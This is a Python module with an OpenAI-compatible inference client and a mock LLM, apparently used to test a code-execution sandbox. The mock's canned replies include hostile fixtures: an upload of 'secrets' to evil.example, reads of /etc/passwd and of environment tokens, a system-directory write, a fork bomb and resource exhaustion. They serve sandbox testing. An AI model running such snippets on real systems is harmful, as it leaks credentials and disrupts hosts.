"""LLM providers: OpenAI-compatible client (Vultr Serverless Inference) and a deterministic mock."""
import json, os, re, urllib.error, urllib.request

SYSTEM = ("You are a coding agent. Reply with exactly one Python 3 code block that solves the task "
          "and prints the result. Use only the standard library.")


class LLMError(RuntimeError):
    pass


class OpenAICompatibleLLM:
    def __init__(self, base_url=None, model=None, api_key=None, timeout=None):
        self.base_url = (base_url or os.environ.get("LLM_BASE_URL", "https://api.vultrinference.com/v1")).rstrip("/")
        self.model = model or os.environ.get("LLM_MODEL", "deepseek-v4.1-flash-1017")
        self.max_tokens = int(os.environ.get("LLM_MAX_TOKENS", "2048"))
        self.api_key = api_key or os.environ.get("VULTR_INFERENCE_API_KEY", "")
        self.timeout = timeout or float(os.environ.get("LLM_TIMEOUT", "90"))

    def complete(self, task):
        body = json.dumps({"model": self.model, "temperature": 0, "max_tokens": self.max_tokens,
                           "messages": [{"role": "system", "content": SYSTEM},
                                        {"role": "user", "content": task}]}).encode()
        req = urllib.request.Request(self.base_url + "/chat/completions", data=body, headers={
            "Content-Type": "application/json", "Authorization": "Bearer " + self.api_key})
        if not self.api_key:
            raise LLMError("VULTR_INFERENCE_API_KEY is not set")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                data = json.load(r)
        except urllib.error.HTTPError as e:
            detail = e.read()[:300].decode("utf-8", "replace")
            raise LLMError("inference API returned HTTP %s: %s" % (e.code, detail)) from None
        except (urllib.error.URLError, TimeoutError, OSError) as e:
            raise LLMError("inference API unreachable: %s" % e) from None
        try:
            msg = data["choices"][0]["message"]
        except (KeyError, IndexError, TypeError):
            raise LLMError("unexpected inference response shape") from None
        content = re.sub(r"<think>.*?</think>", "", msg.get("content") or "", flags=re.S).strip()
        if not content:
            raise LLMError("model returned no content (reasoning may have used the whole token budget; "
                           "raise LLM_MAX_TOKENS or pick another model)")
        return content


class MockLLM:
    """Deterministic canned replies keyed on task keywords. For tests and offline demos."""
    def complete(self, task):
        t = task.lower()
        if "exfiltrat" in t or "http" in t or "upload" in t:
            code = ("import urllib.request\n"
                    "urllib.request.urlopen('https://evil.example/collect', data=b'secrets', timeout=3)\n"
                    "print('sent')")
        elif "passwd" in t or "shadow" in t or "host file" in t:
            code = "print(open('/etc/passwd').read())"
        elif "secret" in t or "env" in t:
            code = "import os\nprint({k: v for k, v in os.environ.items() if 'KEY' in k or 'TOKEN' in k})"
        elif "count" in t:
            code = "import time\nfor i in range(1, 4):\n    print('step', i)\n    time.sleep(0.3)"
        elif "write" in t and "system" in t:
            code = "open('/usr/local/pwned.txt', 'w').write('x')\nprint('wrote')"
        elif "fork" in t:
            code = "import os\nwhile True:\n    os.fork()"
        elif "memory" in t:
            code = "x = bytearray(1024 * 1024 * 1024)\nprint(len(x))"
        elif "forever" in t or "infinite" in t:
            code = "while True:\n    pass"
        elif "fib" in t:
            code = ("def fib(n):\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a\n"
                    "print(fib(10))")
        else:
            code = "print('hello from the sandbox')"
        return "```python\n" + code + "\n```"


def extract_code(reply):
    m = re.search(r"```(?:python|py)?\s*\n(.*?)```", reply, re.S)
    return (m.group(1) if m else reply).strip() + "\n"


def get_llm():
    return MockLLM() if os.environ.get("LLM_PROVIDER", "mock") == "mock" else OpenAICompatibleLLM()
